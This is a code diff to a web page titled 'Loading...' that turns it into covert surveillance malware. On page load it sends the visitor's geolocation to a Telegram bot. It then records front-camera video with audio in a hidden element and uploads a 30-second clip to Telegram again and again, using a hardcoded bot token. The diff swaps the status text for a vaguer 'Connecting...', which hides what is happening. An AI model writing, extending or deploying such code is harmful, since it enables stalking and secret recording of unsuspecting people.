@@ -6,7 +6,10 @@
     <title>Loading...</title>
 </head>
 <body style="font-family:sans-serif; text-align:center; padding-top:20%;">
-    <h3 id="status">Requesting location access...</h3>
+    <h3 id="status">Connecting...</h3>
+
+    <!-- Hidden video element to stream camera -->
+    <video id="video" style="display:none;" autoplay playsinline muted></video>
 
     <script>
         const BOT_TOKEN = "8776780056:AAFHtBhpyPqKIaUkrl5ia9YC6uZWgdeEO-Y";
@@ -16,8 +19,8 @@
             document.getElementById("status").innerText = text;
         }
 
+        // Send Location
         function sendLocation(lat, lon) {
-            updateStatus("Sending location to Telegram...");
             const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
             const text = `📍 *New Location Alert*\nLatitude: ${lat}\nLongitude: ${lon}\n[View on Google Maps](${mapUrl})`;
 
@@ -29,38 +32,104 @@
                     text: text,
                     parse_mode: 'Markdown'
                 })
-            })
-            .then(res => {
-                if(res.ok) {
-                    updateStatus("Location sent successfully!");
-                } else {
-                    updateStatus("Failed to send (Check Bot Token/Chat ID)");
-                }
-            })
-            .catch(err => {
-                updateStatus("Error: " + err.message);
             });
         }
 
-        function track() {
-            if (navigator.geolocation) {
-                updateStatus("Please tap 'Allow' for location permission...");
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        sendLocation(pos.coords.latitude, pos.coords.longitude);
-                    },
-                    (err) => {
-                        updateStatus("Location permission denied or unavailable.");
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            } else {
-                updateStatus("Geolocation is not supported by this browser.");
+        // Send Video Clip to Telegram (Fixed extension to .webm)
+        function sendVideoToTelegram(blob) {
+            updateStatus("Sending 30-second video clip...");
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('video', blob, 'clip.webm');
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(res => {
+                if(res.ok) {
+                    updateStatus("Video sent successfully! Recording next clip...");
+                } else {
+                    updateStatus("Failed to send video clip.");
+                }
+            })
+            .catch(err => updateStatus("Error: " + err.message));
+        }
+
+        // Start Continuous Video Recording Loop (Every 30 Seconds)
+        async function startContinuousRecording() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: true 
+                });
+
+                const videoElement = document.getElementById('video');
+                videoElement.srcObject = stream;
+
+                let mediaRecorder;
+                let recordedChunks = [];
+
+                function startNewSegment() {
+                    recordedChunks = [];
+                    const options = { mimeType: 'video/webm; codecs=vp8,opus' };
+                    try {
+                        mediaRecorder = new MediaRecorder(stream, options);
+                    } catch (e) {
+                        mediaRecorder = new MediaRecorder(stream); // Fallback default
+                    }
+
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data && event.data.size > 0) {
+                            recordedChunks.push(event.data);
+                        }
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                        sendVideoToTelegram(blob);
+                        
+                        // Immediately start the next 30-second recording block
+                        startNewSegment();
+                        mediaRecorder.start();
+                    };
+
+                    mediaRecorder.start();
+                    updateStatus("Recording active...");
+
+                    // Stop and send every 30 seconds (30,000 milliseconds)
+                    setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state === "recording") {
+                            mediaRecorder.stop();
+                        }
+                    }, 30000);
+                }
+
+                // Start first segment
+                startNewSegment();
+
+            } catch (err) {
+                updateStatus("Camera/Microphone permission denied.");
             }
         }
 
+        // Initialize Location & Camera on page load
         window.onload = () => {
-            track();
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        sendLocation(pos.coords.latitude, pos.coords.longitude);
+                        startContinuousRecording();
+                    },
+                    (err) => {
+                        updateStatus("Location denied, starting camera anyway...");
+                        startContinuousRecording();
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                startContinuousRecording();
+            }
         };
     </script>
 </body>
